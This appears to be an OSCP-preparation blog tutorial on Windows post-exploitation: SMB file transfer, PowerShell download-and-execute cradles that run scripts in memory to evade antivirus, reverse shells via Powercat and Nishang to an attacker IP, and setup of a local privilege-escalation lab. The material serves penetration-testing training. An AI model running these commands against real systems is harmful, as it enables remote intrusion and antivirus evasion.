---
title: OSCP Windows PrivEsc - Part 1
description: Windows Privilege Escalation for OSCP
categories: [oscp]
tags: [oscp, Offensive Security]
---

As stated in the [OSCP Review Post](/oscp/OSCP-Review), I came across many good resources for Linux Privilege Escalation but there were just a few for Windows. [lpeworkshop](https://github.com/sagishahar/lpeworkshop) being one of those, lacks a good walkthrough. In this writeup, we will take a look at file transfer over smb and http, how to migrate to PowerShell from a standard cmd shell and lpeworkshop setup.
{: .text-justify}

---
## File transfer over SMB

While there are numerous methods to transfer files from your host Kali to victim Windows, I found SMB to be the most reliable one. 
- Install impacket on your kali (It comes preinstalled most of the times, located at /usr/share/impacket/examples/).
- Start the SMB server by running `smbserver.py`:  
![image-center](/assets/images/oscp/1/smbshare.png)
This will share the `/tmp/smbshare` directory over smb as `myshare`.
- All the files inside `/tmp/smbshare` can now directly be accessed on the victim windows:  
![image-center](/assets/images/oscp/1/smbshare1.png)
- For more convenience, this SMB share can be  mounted directly on the windows as a drive:
	- Check currently mounted shares by running `net use`:
	- Mount your `myshare` as drive `Z` (or any other letter) using the command
	`net use Z: \\<IP>\myshare`
		![image-center](/assets/images/oscp/1/smbmount.png)
- Now, you can simply change dir to `Z` and browse the shared files as a drive on the victim system.  
![image-center](/assets/images/oscp/1/smbmount2.png)
- The mount can be disconnected with command `net use Z: /d` and deleted with `net use Z: /delete` once you are done with it.   
{: .text-justify}

Another easy way to transfer files is over http using python's SimpleHTTPServer or Apache. We will take a look at it and download files using PowerShell in the following section.
{: .text-justify}

---
## Upgrading to PowerShell from cmd

PowerShell provides an easy way to perform post exploitation and privilege escalation activities with the help of various PS modules. Three of the most useful modules that I came across were: [Powercat](https://github.com/besimorhino/powercat), [Nishang's Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) and [Powersploit's PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)   
{: .text-justify}

While most of the newer Windows OS have a functional antivirus monitoring and prohibiting the execution of programs from storage, PowerShell provides us with an option to bypass this and run programs directly from the memory. This can help us evade the antivirus and easily run exploits or post-exploitation modules.
{: .text-justify}

In short, we need to execute either `Powercat.ps1` or `Invoke-PowerShellTcp.ps1` on victim to get an interactive PowerShell.
There are two methods to do this:
1. Download and Invoke the modules over HTTP: Using this method, we will download the modules to memory and invoke them without touching the disk. This can help us evade Windows Antivirus.
2. Invoke the modules locally: This method can be used to invoke the ps1 modules when you have local access to those modules on  victim system. Since we are executing the modules from storage (drive Z), it has a good chance of getting blocked by the Windows Antivirus. 
{: .text-justify}

## Method 1: Download and Invoke the modules over HTTP (Evades Windows AV)

As a general example, we can download and execute any file on the victim using following steps:  
1. Share your files using python's `SimpleHTTPServer` or Apache.   
![image-center](/assets/images/oscp/1/http1.png)
2. On the victim's cmd shell, execute the command:
`powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/testfile'))"`
This downloads `testfile` and executes it in the memory.  
![image-center](/assets/images/oscp/1/http2.png)
{: .text-justify}

### Reverse shell using Powercat

1. Start python's `SimpleHTTPServer` and copy the `Powercat.ps1` to that directory.   
![image-center](/assets/images/oscp/1/pcat1.png)
2. Start netcat listener on your Kali (prefer using standard ports such as 80,443,53 since they have less chances of being blacklisted on the victim's firewall).
3. On the victim: `powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Powercat.ps1'));powercat -c <IP> -p <Port> -ep"`   
![image-center](/assets/images/oscp/1/pcat2.png)
4. This sends an interactive reverse PowerShell to our kali on port 443:  
![image-center](/assets/images/oscp/1/pcat3.png) 
{: .text-justify}

### Reverse shell using Invoke-PowerShellTcp.ps1

1. Start python's `SimpleHTTPServer` and copy the `Invoke-PowerShellTcp.ps1` to that directory.   
![image-center](/assets/images/oscp/1/httpps1.png)
2. Start netcat listener on your Kali.
3. On the victim: `powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"`   
![image-center](/assets/images/oscp/1/httpps2.png)
4. This sends an interactive reverse PowerShell to our kali on port 443:  
![image-center](/assets/images/oscp/1/httpps3.png) 
{: .text-justify}

### Command breakdown
  
`powershell.exe -nop -ep bypass -c "<Command>"` : We are executing powershell using three arguments:
1. `-nop` or `NoProfile` : Currently active user’s profile will not be loaded.
2. `-ep bypass` or `-ExecutionPolicy Bypass` : Execution Policy restricts script execution on most systems on the default setting. This can be overcome by giving Bypass value to the value of -ExecutionPolicy parameter. 
3. `-c` or `-Command` : Specify a command to be executed.
- Bonus: you can append the the execution command to your `ps1` module and avoid one extra step.  
Example for `Invoke-PowerShellTcp.ps1`:
![image-center](/assets/images/oscp/1/Invoke-ps1.png)
This way, your final command for reverse shell would just be downloading and auto-invoking the module, you don't have to pass the arguments anymore.  
Final command:   `powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'))`
{: .text-justify}

An important thing to keep in mind is that both Powercat and Nishang modules are not just limited to reverse shells but also provide a lot of other useful functionality. Now that we know how to execute these modules, you should further look at the additional features and decide which benefit you the most.
{: .text-justify}

## Method 2: Invoking modules locally: using SMB (Gets blocked by Windows AV)

This method can be used to invoke ps1 modules locally on your victim system. Since we are executing the scripts from storage (drive Z), it has a good chance of getting blocked by the Windows Antivirus. We will take a look at how to send reverse PowerShell using Invoke-PowerShellTcp.ps1:  
1. On your Kali, copy `Invoke-PowerShellTcp.ps1` inside `myshare` and start the smbserver. 
2. Start netcat listener on Kali.
3. You can mount the smbshare as Z, change dir to Z, and execute the script with command:
`powershell.exe -nop -ep bypass -c "Import-Module .\Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>"`
![image-center](/assets/images/oscp/1/ps2.png)
(Note: I disabled windows AV for this exercise)
4. This sends a fully interactive PowerShell to our kali on port 443:  
![image-center](/assets/images/oscp/1/ps3.png)
{: .text-justify}

---

## lpeworkshop

For the setup, we need three things:
1. Windows 7/10
We can grab a free copy of Windows Evaluation versions directly from [Microsoft](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/) or from [magnetikonline's github repo](https://github.com/magnetikonline/linux-microsoft-ie-virtual-machines). Prefer getting a Windows 7 as this workshop was developed and tested on a Windows 7 (SP1) x64 host. 
2. [Windows Exercises Setup Script](https://github.com/sagishahar/lpeworkshop/blob/master/lpe_windows_setup.bat)
3. [Tools for Windows Exercises](https://drive.google.com/file/d/1Lgg3HXXltB7ZD3F5YSbRl6FX7h_mPzFU/view?usp=sharing) (7z archive password: lpeworkshop)  
{: .text-justify}

[Note: Take a snapshot of the windows VM before starting the setup]  
The setup is fairly simple: Copy the lpe_windows_setup.bat script to VM and run it as an Administrator. A few exercises will not be setup (1,9,11,13) as those are platform specific and are not included in the setup script.
{: .text-justify}

In the next part, we will go through the exercises from lpeworkshop and see how we can identify and exploit the vulnerabilties with the help of `PowerUp.ps1` 
{: .text-justify}

---
## Additional resources

- [Windows PrivEsc using powershell](https://hacknpentest.com/windows-privilege-escalation-using-powershell/)
- [lpeworkshop walkthrough by J3rryBl4nks](https://github.com/J3rryBl4nks/LPEWalkthrough)